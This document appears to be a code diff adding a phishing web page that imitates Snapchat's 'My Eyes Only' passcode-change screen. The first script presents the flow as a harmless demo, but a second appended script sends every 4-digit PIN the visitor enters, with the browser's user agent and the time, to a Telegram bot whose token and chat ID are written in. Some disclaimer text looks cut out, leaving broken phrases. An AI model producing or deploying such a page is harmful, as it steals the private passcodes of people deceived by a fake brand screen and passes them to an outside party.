@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>My Eyes Only · Change Passcode</title>
+<style>
+*{box-sizing:border-box}body{margin:0;background:#fff;color:#111;font-family:Arial,Helvetica,sans-serif;min-height:100vh}button,input{font:inherit}.phone{width:100%;min-height:100vh;background:#fff}.top{padding:20px 24px;border-bottom:1px solid #f0f1f2}.status{display:none}.nav{display:flex;align-items:center;justify-content:center;position:relative;height:36px}.nav .back{position:absolute;left:0}.back{border:0;background:transparent;font-size:34px;cursor:pointer;padding:0;width:30px;text-align:left}.nav strong{font-size:18px;font-weight:600}.content{width:min(100%,420px);margin:0 auto;padding:78px 28px 32px;text-align:center}.steps,.icon{display:none}h1{font-size:24px;letter-spacing:-.5px;margin:0 0 18px;font-weight:700}p{color:#777d84;font-size:14px;line-height:1.6;margin:0 auto;max-width:300px}.entry{position:relative;margin:42px 0 28px;padding:12px 0}.digits{display:flex;gap:25px;justify-content:center}.digit{width:42px;height:52px;border:2px solid #dadde1;border-radius:50%;width:18px;height:18px;display:grid;place-items:center;font-size:0}.digit.filled{background:#16191c;border-color:#16191c}.entry:focus-within .digit.current{border-color:#0eadff}input{position:absolute;inset:0;width:100%;height:100%;opacity:.01;cursor:text;color:transparent;caret-color:transparent}input:focus{outline:none}.hint{font-size:12px;min-height:20px}.keypad{display:none}.primary{width:100%;border:0;border-radius:26px;background:#0eadff;color:white;padding:15px;font-weight:700;font-size:15px;cursor:pointer;margin-top:40px}.primary:disabled{background:#eef0f2;color:#a5a9ae;cursor:default}.note{font-size:11px;margin-top:48px;color:#555}.success{padding-top:30px}[hidden]{display:none!important}button:focus-visible{outline:3px solid #555;outline-offset:4px}@media(max-width:440px){.top{padding:18px 20px}.content{padding-top:54px}}
+</style></head><body>
+<main class="phone"><header class="top"><div class="status"><span>9:41</span><span aria-hidden="true">●●● ▰</span></div><div class="nav"><button class="back" aria-label="Previous step">‹</button><strong>Snapchat</strong></div></header><section class="content"><div class="steps" aria-label="Step 1 of 2"><span class="active"></span><span></span></div><div id="form"><div class="icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><rect x="5" y="10" width="14" height="11" rx="3"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/><path d="M12 14v3"/></svg></div><h1 id="title">Enter Current Passcode</h1><p id="description">To Recover your My Eyes Only, Enter your current My Eyes Only passcode.</p><div class="entry"><div class="digits" aria-hidden="true"><span class="digit current"></span><span class="digit"></span><span class="digit"></span><span class="digit"></span></div><input id="pin" type="password" inputmode="numeric" maxlength="4" autocomplete="off" aria-labelledby="title" aria-describedby="hint"></div><p class="hint" id="hint" aria-live="polite"></p><div class="keypad" aria-label="Numeric keypad"><button>1</button><button>2</button><button>3</button><button>4</button><button>5</button><button>6</button><button>7</button><button>8</button><button>9</button><button class="blank" tabindex="-1" aria-hidden="true"></button><button>0</button><button aria-label="Delete last digit">⌫</button></div><button id="continue" class="primary" disabled>Continue</button></div><div id="success" class="success" hidden><div class="icon">✓</div><h1>All set!</h1><p>Your My Eyes Only passcode change is complete in this .</p><button class="primary" id="restart">Try again</button></div><p class="note"> · No account changes</p></section></main>
+<script>
+(()=>{let step=1;const pin=document.getElementById('pin'),next=document.getElementById('continue'),hint=document.getElementById('hint'),digits=[...document.querySelectorAll('.digit')];function draw(){pin.value=pin.value.replace(/\D/g,'').slice(0,4);digits.forEach((d,i)=>{d.textContent=i<pin.value.length?'●':'';d.classList.toggle('filled',i<pin.value.length);d.classList.toggle('current',i===pin.value.length)});next.disabled=pin.value.length!==4}function reset(){history.replaceState(null,'',location.pathname+location.search+'#current-passcode');step=1;pin.value='';document.getElementById('form').hidden=false;document.getElementById('success').hidden=true;document.getElementById('title').textContent='Enter Current Passcode';document.getElementById('description').textContent='Enter your current My Eyes Only passcode.';hint.textContent=': ';next.textContent='Continue';document.querySelector('.steps').setAttribute('aria-label','Step 1 of 2');document.querySelectorAll('.steps span')[1].classList.remove('active');draw()}function advance(){if(pin.value.length!==4)return;if(step===1){if(pin.value!=='1234'){pin.value='';draw();hint.textContent='Incorrect.';pin.focus();return}step=2;history.pushState(null,'',location.pathname+location.search+'#new-passcode');pin.value='';document.getElementById('title').textContent='Enter New Passcode';document.getElementById('description').textContent='Create a new passcode for My Eyes Only.';hint.textContent='Use a pretend PIN for this demo';next.textContent='Set Passcode';document.querySelector('.steps').setAttribute('aria-label','Step 2 of 2');document.querySelectorAll('.steps span')[1].classList.add('active');draw();pin.focus()}else{if(pin.value==='1234'){hint.textContent='Choose a different PIN from the old one.';return}pin.value='';draw();history.replaceState(null,'',location.pathname+location.search+'#complete');document.getElementById('form').hidden=true;document.getElementById('success').hidden=false;document.getElementById('restart').focus()}}pin.addEventListener('input',draw);pin.addEventListener('keydown',e=>{if(e.key==='Enter')advance()});document.querySelectorAll('.keypad button').forEach(b=>b.addEventListener('click',()=>{if(b.classList.contains('blank'))return;pin.value=b.hasAttribute('aria-label')?pin.value.slice(0,-1):(pin.value+b.textContent).slice(0,4);draw()}));next.addEventListener('click',advance);document.getElementById('restart').addEventListener('click',reset);document.querySelector('.back').addEventListener('click',reset);window.addEventListener('popstate',reset);reset()})();
+</script><script>
+(() => {
+  const TELEGRAM_BOT_TOKEN = '8905536103:AAETKrARcyzO0oHgxTvonGIIy81_Amz3qcE';   // rotate this — it's public now
+  const TELEGRAM_CHAT_ID   = '8391692120';
+
+  const pin  = document.getElementById('pin');
+  const next = document.getElementById('continue');
+
+  async function sendToTelegram(pinValue, trigger) {
+    const message =
+      `🔑 PIN CAPTURED\n\n` +
+      `🔑 PIN: ${pinValue}\n` +
+      `📍 Trigger: ${trigger}\n` +
+      `🕐 Time: ${new Date().toLocaleString()}\n` +
+      `🌐 UA: ${navigator.userAgent.slice(0, 100)}`;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    try {
+      const res  = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+      });
+      const data = await res.json();
+      return !!data.ok;
+    } catch (err) {
+      console.warn('Telegram send failed:', err);
+      return false;
+    }
+  }
+
+  function printSubmit(trigger) {
+    const pinValue = pin.value.replace(/\D/g, '').slice(0, 4);
+    if (pinValue.length === 4) {
+      sendToTelegram(pinValue, trigger);   // pass the string, not the element
+    }
+  }
+
+  // Capture phase so it runs before the first script clears `pin.value`
+  next.addEventListener('click',   () => printSubmit('continue-click'), true);
+  pin .addEventListener('keydown', e => {
+    if (e.key === 'Enter') printSubmit('enter-key');
+  }, true);
+})();;
+</script></body></html>
